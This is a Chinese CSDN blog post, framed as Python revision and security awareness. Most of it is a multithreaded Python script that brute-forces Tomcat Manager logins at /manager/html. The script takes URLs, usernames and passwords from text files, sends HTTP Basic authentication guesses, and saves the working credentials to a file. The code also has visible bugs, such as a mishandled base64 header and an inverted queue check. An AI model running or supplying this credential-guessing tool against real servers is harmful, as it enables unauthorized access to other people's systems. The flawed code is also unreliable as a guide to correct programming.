
# tomcat安全 - 3-Number - CSDN博客


2017年09月19日 17:04:56[庞叶蒙](https://me.csdn.net/pangyemeng)阅读数：289


说明：此文章紧做为培养安全开发人员安全意识，不能用于任何违法安全活动。
# 0x01 缘由
最近在复习python这块的开发，于是与安全合起来学习之。
# 0x02 tomcat安全
网上有很多介绍，大部分是对账号密码把控不严导致。传送：http://sec.chinabyte.com/442/12671442.shtml
# 0x03 一个小脚本复习python
python 3.6
```python
#!/usr/bin/env python
 # -*- coding: utf-8 -*-
import sys
import requests
import threading
import queue
import time
import base64
import os
# headers = {'Content-Type': 'application/x-www-form-urlencoded','User-Agent': 'Googlebot/2.1 (+[url]http://www.googlebot.com/bot.html[/url])'}
u = queue.Queue()
p = queue.Queue()
n = queue.Queue()
# def urllist()
urls = open('url.txt', 'r', encoding='UTF-8')
def urllist():
    for url in urls:
        url = url.rstrip()
        u.put(url)
       
def namelist():
    names = open('name.txt', 'r', encoding='UTF-8')
    for name in names:
        name = name.rstrip()
        n.put(name)
  
def passlist():
    passwds = open('pass.txt', 'r', encoding='UTF-8')
    for passwd in passwds:
        passwd = passwd.rstrip()
        p.put(passwd)
  
def weakpass(url):
    namelist() #类似读出用户名到队列
    while not n.empty():
        name = n.get()
        # print name
        passlist() #类似读出密码到队列
        while not p.empty():
            good()
            # name = n.get()
            passwd = p.get()
            # print passwd
            headers = {'Authorization': 'Basic %s==' % (base64.b64encode((name + ':' + passwd).encode('utf-8')))} #构造头部
            try:
                #发送网络请求
                r = requests.get(url, headers=headers, timeout=3)
                # print r.status_code
                if r.status_code == 200:
                    print ('[turn]' + url + ' ' + name + ':' + passwd )
                    f = open('good.txt', 'a+')
                    f.write(url + ' ' + name + ':' + passwd + '\n')
                    f.close()
                else:
                    print( '[false]  ' + url + ' ' + name + ':' + passwd)
                    print( 'status code : %s  ' % r.status_code)
            except:
                print ('[except] ' + url + ' ' + name + ':' + passwd)
                print( 'status code : %s  ' % r.status_code)
  
def list():
    while u.empty():
        url = u.get()
        weakpass(url)
  
def thread():
    urllist() #将url读出放入队列
    tsk = []  #顶一个列表类型，存放url任务
    for i in open('url.txt').read().split('\n'):
        i = i + '/manager/html'
        t = threading.Thread(target=weakpass, args=(i,))  #创建线程 回调函数为weakpass
        tsk.append(t)
    for t in tsk: #开启线程
        t.start()
        t.join(1)
        # print "current has %d threads" % (threading.activeCount() - 1)
def good():
    good_ = 0
    for i in open('good.txt').read().split('\n'):
        good_ += 1
    os.system('title "weakpass------good:%s"' % (good_))
  
if __name__ == "__main__": #类似c中main函数，也可以不用类似shell脚本中
   # alllist()
    thread() #多线程处理目标url
```

# 0x04 总结
此次主要复习request、queue、thread等工具，学习python主要为将来渗透过程打下基础。
说明：此文章紧做为培养安全开发人员安全意识，不能用于任何违法安全活动。

